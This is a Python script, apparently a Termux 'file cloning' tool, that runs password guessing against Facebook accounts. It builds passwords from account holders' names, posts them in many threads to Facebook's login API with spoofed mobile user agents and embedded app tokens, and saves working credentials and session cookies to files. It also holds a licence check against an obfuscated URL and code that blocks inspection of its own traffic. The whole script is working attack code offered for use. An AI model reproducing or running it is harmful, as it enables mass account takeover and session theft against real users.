#!/usr/bin/python -tt
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
ugen=[]
ugen2=[]
tokenku=[]
#----------import----------#
import os,sys
import os,base64,zlib,pip,urllib,time,random,subprocess
import os,requests,json,time,re,random,sys,uuid,string,subprocess
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as tred
import uuid
import random 
import httpx
import json
import sys
#-----------Opening Print-----------#
print(' [\033[1;32m●\033[1;37m]\x1b[38;5;121m CHECKING JAHID SERVER !\033[1;37m [\033[1;32m–\033[1;37m]\033[1;37m')
os.system(f'xdg-open https://facebook.com/groups/790381136153614/')
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
############# CALLED BY API SYSTEM #############
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
############# Trying To Capture Protect #############
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'sessions.py','r').read():
	pass
else:
	exit('First Off Capture Module 👽😄')
############# Capturing Off Done #############
def API_UA():
        #ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=2.75,width=1080,height=2134};FBLC/en_US;FBRV/348250972;FBCR/Axita;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/205.0.0.85.43;FBBV/234938357;FBDM/{density=3.0,width=1080,height=2130};FBLC/en_US;FBRV/373849731;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810F;FBSV/8.0.0;FBOP/9;FBCA/armeabi-v7a:armeabi;]'
        return ua
#----------USERAGENT M2---------#
def BUDA_PASTE():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/310.0.0.56.14;FBBV/313886088;FBDM/{density=3.0,width=1080,height=2130};FBLC/en_US;FBRV/433511452;FBCR/O2 - UK;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6;FBSV/9;FBOP/9;FBCA/armeabi-v7a:armeabi;]'
        return ua
        
def REALME_USERAGENT():
        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(10, 99))+".0.0."+str(random.randint(1000, 9999))+";FBBV/"+str(random.randint(1000000, 9999999))+";[FBAN/FB4A;FBAV/173.0.0.69.51;FBBV/425583771;FBDM/{density=1.5,width=720,height=1080};FBLC/en_US;FBCR/Robi;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2202;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        return ua
        

#____APPROVAL SYSTEM ADD_____#

import os,base64,sys,re
try:
    import rich
except:
    os.system("pip install rich")
    import rich
from rich import print as rp
from rich.panel import Panel
from datetime import datetime
K1=str(os.getuid())
K2=str(os.getgid())
num_key="h".join(K1+K2)
cm=num_key.encode("ASCII")
cmr=base64.b64encode(cm)
cm2=str(cmr)
#####KEY NAME ######
kx=cm2.replace("b","SEX")
####################
key=kx.upper()
##### APPROVE URL #####

url=base64.b64decode(b'aHR0cHM6Ly9naXRodWIuY29tL1NLQkVSLUNZQkVSL0NvbnRvbC9ibG9iL21haW4vU3VydmVyLnR4dA==')

######################
main_url=url.decode("ASCII")
all_datA=[]
    #print (logo)


def req(team_elite,main_url):
    try:
        lx=team_elite.get(main_url)
        approved=lx.text
        return approved
    except:
        rp("[bold red] Internet Error")
        sys.exit()

def url_sefty():
    try:
        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py","r").read()
        vx=re.search("print",h)
        if vx == None:
            report= "pure_user"
        else:
            report= "bypass_user"
        return report
    except:
         pass

def url_sefty2():
    try:
        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_api.py","r").read()
        vx=re.search("print",h)
        if vx == None:
            report= "pure_user"
        else:
            report= "bypass_user"
        return report
    except:
         pass

def key_sefty():
    global key
    try:
        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_models.py","r").read()
        vx=re.search(key,h)
        if vx == None:
            report= "pure_user"
        else:
            report= "bypass_user"
        return report
    except:
         pass

def key_sefty2():
    global key
    try:
        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py","r").read()
        vx=re.search(key,h)
        if vx == None:
            report= "pure_user"
        else:
            report= "bypass_user"
        return report
    except:
         pass

def lisens():
    global key 
    ky=key.split('\'')[1]
    li=ky[5:15]
    try:
        open("/data/data/com.termux/files/usr/bin/.sifa.txt","r").read()
        expired_ck()
    except:
        while True:
            os.system("clear")
            print(logo)
            xcx=input("License Key =>")
            if xcx == li:
                open("/data/data/com.termux/files/usr/bin/.sifa.txt","a").write("done")
                expired_ck()
                break 
            else:
                continue 
    
def expired_ck():
    global key,all_datA
    tita=str(datetime.now()).split(" ")[0]
    tic=tita.split("-")
    pure_data=int(tic[0]+tic[1]+tic[2])
    for x in all_datA:
        if key in x:
            
            break 
        else:
            continue
    
    SEX=int(x.split("\'|")[1])
    
    if pure_data < SEX:
        menu()
        
        
        
    else:
        print(" YOUR APPROVAL DATE IS EXPIRED")
    
def uninstall_able():
    try:
        open("/data/data/com.termux/files/usr/bin/pip","r").read()
        open("/data/data/com.termux/files/usr/bin/pip3","r").read()
    except:
        print(" you are useing Ant-uninstall system ")
        sys.exit()

def apv():
    global key,main_url
    uninstall_able()
    if "pure_user" == url_sefty():
        pass
    elif "bypass_user" == url_sefty():
        rp(" Trun off your bypass system")
        sys.exit()
    
    if "pure_user" == url_sefty2():
        pass
    elif "bypass_user" == url_sefty2():
        rp(" Trun off your bypass system")
        sys.exit()
    
    
    if "pure_user" == key_sefty():
        pass
    elif "bypass_user" == key_sefty2():
        rp(" Trun off your bypass system")
        sys.exit()
    if "pure_user" == key_sefty():
        pass
    elif "bypass_user" == key_sefty2():
        rp(" Trun off your bypass system")
        sys.exit()
    
    os.system("pip uninstall httpx requests -y")
    os.system("pip install requests httpx")
    import httpx
    team_elite=httpx.Client() 
    data=req(team_elite,main_url)
    for dta in data.splitlines():
        all_datA.append(dta)
    row=[]
    for r in data.splitlines():
        rx=r.split("|")[0]
        row.append(rx)
    if key not in row:
        os.system("clear")
        logo=(""".
 ▄▄ · ▄ •▄ ▄▄▄▄· ▄▄▄ .▄▄▄  
▐█ ▀. █▌▄▌▪▐█ ▀█▪▀▄.▀·▀▄ █·
▄▀▀▀█▄▐▀▀▄·▐█▀▀█▄▐▀▀▪▄▐▀▀▄ 
▐█▄▪▐█▐█.█▌██▄▪▐█▐█▄▄▌▐█•█▌
▀▀▀▀ ·▀  ▀·▀▀▀▀  ▀▀▀ .▀  ▀ """)
        rp(Panel.fit(" [green]</> KEY "+key, title="[bold yellow]NOT APPROVED", subtitle="[bold blue]GET PERMISSION"))
        #####----Message link
        os.system("xdg-open https://wa.me/+8801917466867")
    else:
        lisens()


#----------logo----------#
logo=(f"""
\x1b[38;5;46m.▄▄ · ▄ •▄ ▄▄▄▄· ▄▄▄ .▄▄▄  
\x1b[38;5;46m▐█ ▀. █▌▄▌▪▐█ ▀█▪▀▄.▀·▀▄ █·
\x1b[38;5;47m▄▀▀▀█▄▐▀▀▄·▐█▀▀█▄▐▀▀▪▄▐▀▀▄ 
\x1b[38;5;47m▐█▄▪▐█▐█.█▌██▄▪▐█▐█▄▄▌▐█•█▌
\x1b[38;5;48m ▀▀▀▀ ·▀  ▀·▀▀▀▀  ▀▀▀ .▀  ▀ 
{G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} {G1}Jàhïd hàššâń
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{G1} V{G1}/{G1}5.0
{G1}[{A}≈{G1}]{G1} GITHUB    {A}➢{G1} SKBER-CYBER
{G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
#----------line----------#
def line():
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#----------menu----------#
def main():
    clear()
    print(' \x1b[38;5;46m[+]YOUR KEY:\x1b[38;5;46m'+key)
    line()
    print(' \x1b[38;5;46m[+]KEY APPROVED DONE')
    line()
    print(" \x1b[38;5;46m[A] FILE CLONEING\033[1;37m")
   # print(" \x1b[38;5;49m[B] RANDOM CLONEING\033[1;37m")
    print(" \x1b[38;5;46m[×] EXIT")
    line()
    option=input('\x1b[38;5;46m [✓] CHOICE <> ')
    if option in ['1','A']:
        _M_FILE_()
   # if option in ['2','B']:
    	#os.system('python RN.py')
       # _M_FILE_()
    else:
        exit(' \x1b[38;5;50m[●] Thanks ')
#----------file----------#
def _M_FILE_():
		file = input(f' \n {G1}[●] {G1}PUT FILE LOCATION <> ');line()
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f'{G1} [X] FILE LOCATION NOT FOUND ')
			exit()
		print(f' {G1}[●] METHOD <> A <> B ');line()
		mthd=input(f'{G1} [✓] CHOICE <> ');line()
		plist=[]
		try:
			ps_limit = int(input(f'{G1} [●] ENTER PASSWORD LIMIT <> '));line()
		except:
			ps_limit =1
		print(f'{G1} [●]{G1} EXAMPLE: {G1}first last ● last1234 ● last123 \033[1;37m');line()
		for i in range(ps_limit):
			plist.append(input(f'{G1} [●]{G1} PUT PASSWORD {i+1} <> '));line()
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f'\x1b[38;5;49m[●] TOTAL ACCOUNT <> '+total_ids+f'\033[1;92m\n[●] SELECT METHOD <> M • {mthd}\033[1;37m')
			print(f"\x1b[38;5;49m[●] LIMIT OF PASS <> {ps_limit}\033[1;37m")
			#print(f" \033[1;37m[\033[1;32m–\033[1;37m] {G1}USE AIRPLANE MODE FOR OK IDS 💥\033[1;37m")
			line()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','A']:
					crack_submit.submit(MATHOD_1,ids,names,passlist)
				if mthd in ['2','B']:
					crack_submit.submit(MATHOD_2,ids,names,passlist)
		print(' ')
		line()
		print(' [\033[1;32m●\033[1;37m] {G1}CRACKING COMPLETE 💥\033[1;37m')
		print(' [\033[1;32m●\033[1;37m] {G1}TOTAL OKAY ID ● '+str(len(oks)))
		input(' [\033[1;32m●\033[1;37m] {G1}PRESS ENTER TO BACK 🔙 \033[1;37m')
		main()   
#----------method------------#
def MATHOD_1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            cl = random.choice([f'\x1b[38;5;196m','\x1b[38;5;197m','\x1b[38;5;198m','\x1b[38;5;199m','\x1b[38;5;200m','\x1b[38;5;201m'])
            sys.stdout.write(f'\r     \x1b[38;5;153m[{G1}M1\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[{G1}JAHID\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[\x1b[38;5;212m{loop}\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[{G1}OK:{len(oks)}\x1b[38;5;153m]');sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': API_UA(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:            	
                print('\r\r\x1b[38;5;46m [JAHID•OK] '+ids+' <> '+pas)   
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print("\r\r\x1b[38;5;193m<>❮ "+coki)
                oks.append(ids)
                open('/sdcard/JAHID–OKEY–M1.txt', 'a').write(ids+'|'+pas+'\n')
                open('/sdcard/JAHID•COOKIE•M1.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;34m [JAHID•CP] '+ids+' <> '+pas)
                open('/sdcard/JAHID-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass

def MATHOD_2(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            cl = random.choice([f'\x1b[38;5;196m','\x1b[38;5;197m','\x1b[38;5;198m','\x1b[38;5;199m','\x1b[38;5;200m','\x1b[38;5;201m'])
            sys.stdout.write(f'\r     \x1b[38;5;153m[{G1}M1\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[{G1}JAHID\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[\x1b[38;5;212m{loop}\x1b[38;5;153m]\x1b[38;5;215m-\x1b[38;5;153m[{G1}OK:{len(oks)}\x1b[38;5;153m]');sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': REALME_USERAGENT(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:            	
                print('\r\r\x1b[38;5;46m [JAHID•OK] '+ids+' <> '+pas)   
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                #print("\r\r\x1b[38;5;211m<>❮ "+coki)
                oks.append(ids)
                open('/sdcard/JAHID–OKEY–M2.txt', 'a').write(ids+'|'+pas+'\n')
                open('/sdcard/JAHID•COOKIE•M2.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;34m [JAHID•CP] '+ids+' <> '+pas)
                open('/sdcard/JAHID–CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass


#----------end----------#
main()